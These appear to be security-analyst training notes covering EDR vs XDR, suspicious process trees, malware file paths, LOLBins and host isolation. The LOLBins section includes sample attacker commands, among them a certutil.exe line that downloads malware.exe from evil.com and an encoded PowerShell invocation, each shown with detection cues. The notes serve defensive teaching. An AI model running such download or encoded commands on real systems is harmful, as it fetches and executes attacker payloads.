## 1: EDR vs XDR

###  EDR = Endpoint Detection & Response
FOCUS: Endpoints only (laptops, desktops, servers)

**CAPABILITIES:**
- Process monitoring
- File activity
- Registry changes
- Network connections from endpoint
- Threat detection
- Host isolation
- Forensic investigation

**EXAMPLES:**
- CrowdStrike Falcon
- Microsoft Defender for Endpoint
- SentinelOne
- Carbon Black


### XDR = Extended Detection & Response
**FOCUS:** Multiple sources (endpoints + network + cloud + email)

**CAPABILITIES:**
- Everything EDR does
- Network traffic analysis
- Email security
- Cloud workload protection
- Identity monitoring
- Cross-source correlation

**EXAMPLES:**
- Microsoft 365 Defender
- Palo Alto Cortex XDR
- CrowdStrike Falcon Complete
- Trend Micro Vision One


#### EDR vs XDR Comparison

| Aspect          | EDR                          | XDR                                                                 |
|-----------------|------------------------------|----------------------------------------------------------------------|
| Scope           | Endpoints only               | Endpoints + Network + Cloud + Email                                 |
| Data Sources    | Single (endpoint)            | Multiple                                                             |
| Correlation     | Within endpoint              | Across all sources                                                   |
| Visibility      | Host-level                   | Enterprise-wide                                                      |
| Example Alert   | "Malware on LAPTOP-05"       | "Phishing email → User clicked → Malware on LAPTOP-05 → Lateral movement to SERVER-01" |


_____

# 2: Process Tree Analysis

## Process Tree
 Shows parent-child relationships between processes.

**NORMAL PROCESS TREE:**

explorer.exe (User desktop)
    └── chrome.exe (User opened browser)
        └── chrome.exe (Browser tabs)

**SUSPICIOUS PROCESS TREE: 🚨**

WINWORD.EXE (User opened Word doc)
    └── cmd.exe (Command prompt spawned!)
        └── powershell.exe (PowerShell executed!)
            └── whoami.exe (Reconnaissance!)


#### Suspicious Parent-Child Relationships

## Suspicious Parent-Child Process Relationships (Windows)

| Parent Process            | Suspicious Child           | Indicates         |
| ------------------------- | -------------------------- | ----------------- |
| WINWORD.EXE               | cmd.exe, powershell.exe    | Macro malware     |
| EXCEL.EXE                 | cmd.exe, powershell.exe    | Macro malware     |
| OUTLOOK.EXE               | cmd.exe, powershell.exe    | Email exploit     |
| iexplore.exe / chrome.exe | cmd.exe, powershell.exe    | Drive-by download |
| svchost.exe               | cmd.exe (not normal child) | Process injection |
| wmiprvse.exe              | powershell.exe             | WMI abuse         |
| mshta.exe                 | powershell.exe, cmd.exe    | HTA attack        |

#### Normal vs 🚨 Suspicious
```
✅ NORMAL:
explorer.exe → notepad.exe (User opened Notepad)
services.exe → svchost.exe (Windows service starting)
cmd.exe → ping.exe (Admin running ping)

🚨 SUSPICIOUS:
WINWORD.EXE → powershell.exe (Macro execution!)
OUTLOOK.EXE → mshta.exe (Email exploit!)
svchost.exe → whoami.exe (Reconnaissance!)
explorer.exe → certutil.exe -urlcache (Download!)
```


____

# 3: Suspicious File Paths

#### Dangerous Locations

Malware commonly uses these directories:

| Location | Path | Why Dangerous |
|----------|------|---------------|
| **Temp Folders** | `C:\Windows\Temp\` | Easy write access |
| | `C:\Users\<user>\AppData\Local\Temp\` | |
| **AppData** | `C:\Users\<user>\AppData\Local\` | Hidden, persistent |
| | `C:\Users\<user>\AppData\Roaming\` | |
| **ProgramData** | `C:\ProgramData\` | System-wide access |
| **Public Folders** | `C:\Users\Public\` | Everyone has access |
| **Recycle Bin** | `C:\$Recycle.Bin\` | Hidden from users |


#### Suspicious Patterns

| Pattern | Why Suspicious | Example |
|---------|----------------|---------|
| EXE in Temp | Legitimate apps don't run from Temp | `C:\Temp\svchost.exe` |
| EXE in AppData | Persistence location | `C:\Users\john\AppData\Roaming\update.exe` |
| Misspelled system file | Masquerading | `svch0st.exe`, `csrrs.exe` |
| System name, wrong path | Fake system file | `C:\Temp\svchost.exe` |
| Random name | Auto-generated malware | `a3f2x9.exe`, `tmpC4D2.exe` |
| Hidden file | Evasion technique | `.hidden.exe` |

---

#### Legitimate System Paths

**Real system files location:**
- C:\Windows\System32\svchost.exe 
- C:\Windows\System32\cmd.exe 
- C:\Windows\System32\powershell.exe 

**SUSPICIOUS - SAME NAME, WRONG PATH:**
- C:\Temp\svchost.exe
- C:\Users\Public\cmd.exe
- C:\ProgramData\powershell.exe 

____


# 4: LOLBins (Living Off The Land Binaries)

## LOLBins

**Legitimate Windows tools** abused by attackers to avoid detection.

**Why attackers use them:**
- ✅ Pre-installed on Windows
- ✅ Signed by Microsoft (trusted)
- ✅ Often whitelisted
- ✅ Hard to block (breaks legitimate use)

### Critical LOLBins

#### 1. powershell.exe -enc

```
PURPOSE: Execute encoded (hidden) commands

MALICIOUS USE:
powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...

WHAT IT DOES:
- Decodes and runs Base64 command
- Hides true intent from logs

DETECTION:
- "-enc" or "-encoded" flag
- Long Base64 string as argument
```

#### 2. certutil.exe -urlcache
```
PURPOSE: Certificate utility (legitimate)

MALICIOUS USE:
certutil.exe -urlcache -split -f http://evil.com/malware.exe C:\Temp\mal.exe

WHAT IT DOES:
- Downloads file from internet
- Saves to local disk

DETECTION:
- "-urlcache" flag
- "-f" (force) flag
- URL in command line
```

___

# Lesson 5: Isolate Host Action

## Host Isolation
Immediately disconnect compromised host from network while maintaining EDR connection.
```
BEFORE ISOLATION:
[Infected Host] ←→ [Network] ←→ [Other Systems]
                                        ↑
                               Malware can spread!

AFTER ISOLATION:
[Infected Host] ←X→ [Network] ←→ [Other Systems]
       ↓
[EDR Cloud] ← Still connected for investigation!
```


### When to Isolate:
```
✅ ISOLATE IMMEDIATELY:
- Active ransomware
- C2 communication detected
- Credential dumping in progress
- Lateral movement attempts
- Active data exfiltration

⚠️ CONSIDER BEFORE ISOLATING:
- Critical production server (get approval)
- Domain controller (major impact)
- Evidence preservation needed
```

### What Isolation Does:
```
BLOCKED:
❌ All network traffic
❌ File share access
❌ Internet access
❌ Lateral movement
❌ C2 communication

MAINTAINED:
✅ EDR agent connection
✅ Remote investigation
✅ Memory collection
✅ Forensic analysis
✅ Remediation commands
```